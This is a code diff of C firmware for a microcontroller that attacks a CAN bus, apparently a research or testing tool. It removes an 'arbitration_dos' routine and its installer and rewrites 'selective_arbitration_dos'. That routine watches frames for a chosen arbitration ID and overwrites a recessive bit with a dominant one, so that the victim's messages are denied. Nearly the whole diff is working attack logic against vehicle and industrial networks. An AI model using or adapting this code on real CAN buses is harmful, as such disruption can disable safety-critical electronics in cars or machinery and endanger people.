@@ -53,8 +53,6 @@ static uint8_t targetBit=0;//targetBit, matchedBits, and bitsToTargetBit are use
 static uint16_t matchedBits=0;//counter for matched bit in the target ID
 static uint16_t bitsToTargetBit=0;//the number of bits from the most significant bit to the targetBit
 static uint8_t arbid_found =0;
-static uint8_t nextIsStuffed=0;
-static uint8_t temp=0;
 
 static uint32_t overload_frame_count = 0;
 static volatile uint32_t overload_frames_sent = 0;
@@ -274,14 +272,6 @@ void can_init()
     HAL_NVIC_SetPriority(EXTI15_10_IRQn, 0, 0);
 }
 
-/* delay function useful for various attacks
-void delay_us(uint16_t us)
-{
-  TIM_Set_Counter(TIM4,0);//Counter starts from 0
-  TIM_Cmd(TIM4,ENABLE);//Enabled
-  while(TIM_GetCounter(TIM4)<us);
-  TIM_Cmd(TIM4,DISABLE);//Disabled
-}*/
 /* Checks to see if we've received a message and prints it out */
 void can_poll()
 {
@@ -922,70 +912,34 @@ void uninstall_selective_continuous_dominant_state()
   GPIOB->ODR |= GPIO_PIN_13;
   timer3_callback_handler = NULL;
 }
-
-void arbitration_dos()
-{
-  GPIOA->ODR ^= GPIO_PIN_4;
-  // The (12-targetBit) below reppresents the index of the least significant recessive bit to attack
-  // 12, instead of 11 (size of ID), is because SOF is ignored and is the first to be read
-//  if((bits_read == bitIndex) && (last_bit == 1) /*&& (matchedBits == bitsToTargetBit)*/) {}
-  uint8_t bit =1;
-
-  if ((bits_read>=2 && bits_read <=bitsToTargetBit))
-  {
-    if(arbid_found==1)
-      bit=0;//means that the previos bit was stuffed and bits_read didn't change but last_bit did
-    if(((attack_arbid>>(12-bits_read)&1) == last_bit))
-    {
-        matchedBits++;
-        if((matchedBits == bitsToTargetBit-1))//means the next bit is the targetBit. (-1 because we read bits from bits_read: 2)
-        {
-          arbid_found=1;
-          bit=0;
-        }
-  //  }
-    }
-  }
-  if(arbid_found==1)//Only transmit when the target ID is found
-  {
-    if(bit == 1)
-    {
-        //GPIOA->ODR |= GPIO_PIN_15;//Debug pin
-        GPIOB->ODR |= GPIO_PIN_13;
-    }
-    else
-    {
-        //GPIOA->ODR &= ~GPIO_PIN_15;//Debug pin
-        GPIOB->ODR &= ~GPIO_PIN_13;
-    }
-  }
-}
-
 void selective_arbitration_dos()
 {
   // The (12-targetBit) below reppresents the index of the least significant recessive bit to attack
   // 12, instead of 11 (size of ID), is because SOF is ignored and is the first to be read
 //  if((bits_read == bitIndex) && (last_bit == 1) /*&& (matchedBits == bitsToTargetBit)*/) {}
   uint8_t bit =1;
-
   if ((bits_read>=2 && bits_read <=bitsToTargetBit))
   {
-    if(arbid_found==1)
-      bit=0;//means that the previos bit was stuffed and bits_read didn't change but last_bit did
-    if(((attack_arbid>>(12-bits_read)&1) == last_bit))
-    {
-        matchedBits++;
-        if((matchedBits == bitsToTargetBit-1))//means the next bit is the targetBit. (-1 because we read bits from bits_read: 2)
-        {
-          arbid_found=1;
-          bit=0;
-        }
-  //  }
+    GPIOA->ODR ^= GPIO_PIN_15;
+    if((attack_arbid>>(12-bits_read)&1) == last_bit)
+    {GPIOA->ODR ^= GPIO_PIN_4;
+      matchedBits++;
+      if(matchedBits == bitsToTargetBit-1)//means the next bit is the targetBit. (-1 because we read bits from bits_read: 2)
+      {
+        //GPIOA->ODR ^= GPIO_PIN_15;
+        bit =2;
+        //bit=0;//overwrite the recessive bit with a dominant one
+      }
+      else if((bits_read==bitsToTargetBit-1) && matchedBits<bitsToTargetBit-1)//skip the current frame because it doesn't have the target ID
+      {
+        //GPIOA->ODR ^= GPIO_PIN_4;
+        bits_read=255;//end reading this frame and start over with the next one
+      }
     }
   }
   else if(bits_read > bitsToTargetBit && bits_read <15)//the rest of the arbid the RTR, IDE and reserved bits are all zeros
   {
-
+    //GPIOA->ODR ^= GPIO_PIN_4;
     if(same_bits_count == 5)
     {
         bit = last_bit ^ 0x01;
@@ -993,6 +947,7 @@ void selective_arbitration_dos()
     else
       bit =0;
   }
+  /* Check to see if we have received an arbitration ID and it matches the one we are attacking */
   else if((bits_read >= 15))
   {
       //GPIOA->ODR ^= GPIO_PIN_4;
@@ -1024,19 +979,28 @@ void selective_arbitration_dos()
           bit = 1;
       }
   }
-  if(arbid_found==1)//Only transmit when the target ID is found
+  /* Set the calculated level */
+  if(bit == 1)
   {
-    if(bit == 1)
-    {
-        //GPIOA->ODR |= GPIO_PIN_15;//Debug pin
-        GPIOB->ODR |= GPIO_PIN_13;
-    }
-    else
-    {
-        //GPIOA->ODR &= ~GPIO_PIN_15;//Debug pin
-        GPIOB->ODR &= ~GPIO_PIN_13;
-    }
+      GPIOA->ODR |= GPIO_PIN_15;
+      //GPIOB->ODR |= GPIO_PIN_13;
   }
+  else if(bit == 2)
+  {
+    //GPIOA->ODR ^= GPIO_PIN_4;
+      //GPIOA->ODR |= GPIO_PIN_15;
+      //GPIOB->ODR |= GPIO_PIN_13;
+      // pass because bit has been injected
+  }
+  else
+  {
+      GPIOA->ODR &= ~GPIO_PIN_15;
+      //GPIOB->ODR &= ~GPIO_PIN_13;
+  }
+/*bit = last_bit;
+  if ((bits_read ==bitIndex-1) && (last_bit=0x01))
+    GPIOA->ODR ^= GPIO_PIN_15;
+  */
 }
 void testFunction()
 {
@@ -1092,45 +1056,6 @@ void testFunction()
 
 //Once we found overwrite the target recessive bit, we complete the frame
   //timer3_callback_handler = selective_arbitration_dos;
-}
-void install_arbitration_dos()
-{
-  GPIOA->ODR ^= GPIO_PIN_4;
-  //identify the index of the least significant recessive bit of the target arbid
-  int i=0;
-  while(!((1 << i) & attack_arbid))//check if the i-th bit is set (recessive)
-  {
-      i++;
-  }
-  targetBit=i;//Now we know the index of which bit to attack
-  bitsToTargetBit= 11 - targetBit;
-  attackingArbid = attack_arbid;
-  attackingArbid &= ~(1<<targetBit);//clear the target bit in the arbid to be attacked
-/*  do
-  {
-      //printf("Arbid: %lx\r\n will be replaced by %lx\r", arbid, attackingArbid);
-      write_string("Arbid: 0x");
-      write_int(attack_arbid);
-      write_string(" will be replaced by: 0x");
-      write_int(attackingArbid);
-      write_string("\r\nEnter data for the attack frame: ");
-      write_string("\r\nData length: ");
-      data_replacer_len = read_int();
-      if(data_replacer_len > 8)
-          write_string("Invalid length entered\r\n");
-  } while(data_replacer_len > 8);
-  data_replacer_len_bits = data_replacer_len * 8;
-
-  for(int i = 0; i < data_replacer_len; i++)
-  {
-      write_string("Byte ");
-      write_int(i);
-      write_string(": 0x");
-      data_replacer_data[i] = read_hex() & 0xFF;
-  }
-  data_replacer_crc = can_crc(attackingArbid, 0, 0, data_replacer_len, data_replacer_data);
-*/
-  timer3_callback_handler = arbitration_dos;
 }
 void install_selective_arbitration_dos()
 {
